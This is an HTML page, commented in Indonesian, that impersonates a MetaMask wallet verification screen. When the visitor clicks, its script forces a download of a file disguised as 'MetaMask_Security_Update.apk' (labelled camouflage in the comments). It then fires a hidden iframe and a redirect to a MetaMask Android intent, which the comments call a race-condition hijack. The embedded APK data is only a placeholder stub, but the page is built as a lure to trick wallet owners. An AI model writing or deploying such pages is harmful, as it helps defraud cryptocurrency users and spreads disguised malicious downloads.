<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; cursor: pointer; text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 4px solid #f6851b; }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🦊 MetaMask Verification</h2>
  <p>Klik di mana saja untuk memverifikasi wallet Anda.</p>
  <div id="log">Sistem siap...</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. METAMASK INTENT SCHEME (ANDROID)
  // ============================================
  // Target package: io.metamask (atau com.metamask)
  var METAMASK_INTENT = "intent://#Intent;" +
                        "package=io.metamask;" +
                        "scheme=metamask;" +
                        "S.browser_fallback_url=" + encodeURIComponent("https://metamask.io/") + ";" +
                        "end;";

  // ============================================
  // 2. TRIGGER RACE CONDITION (APK & INTENT)
  // ============================================
  function triggerMetamaskHijack() {
    log("[!] Memicu Race Condition (APK + Intent)...");

    // A. Kamuflase: Unduh file APK (seolah-olah update)
    try {
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      
      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
      var url = URL.createObjectURL(blob);
      
      var a = document.createElement('a');
      a.href = url;
      a.download = 'MetaMask_Security_Update.apk';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      
      log("[+] APK Download Triggered (Camouflage).");
    } catch(e) {}

    // B. Inject Iframe untuk memicu Intent MetaMask
    // Eksekusi dalam 10ms setelah APK mulai terunduh
    setTimeout(function() {
      try {
        var iframe = document.createElement('iframe');
        // Sandbox yang meminta izin top navigation
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        
        // Gunakan srcdoc untuk menyuntikkan redirect
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              // Redirect ke Intent MetaMask
              window.top.location.href = "${METAMASK_INTENT}";
            <\/script>
          </body>
          </html>
        `;
        
        document.getElementById('launcher-container').appendChild(iframe);
        log("[+] MetaMask Intent Triggered via Iframe.");
        
        // C. Fallback: Top-Level Redirect (Jika iframe gagal)
        setTimeout(function() {
          window.location.href = METAMASK_INTENT;
        }, 100);

      } catch(e) {
        log("[-] Iframe Error: " + e.message);
      }
    }, 10); // 10ms Race Window

  }

  // ============================================
  // 3. TRIGGER AWAL (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>Memverifikasi...</h2>
      <p>Menghubungkan ke MetaMask...</p>
      <div id="log">Memulai...</div>
    `;
    logEl = document.getElementById('log');

    // Jalankan Hijack
    triggerMetamaskHijack();

  }, { once: true });

})();
</script>
</body>
</html>
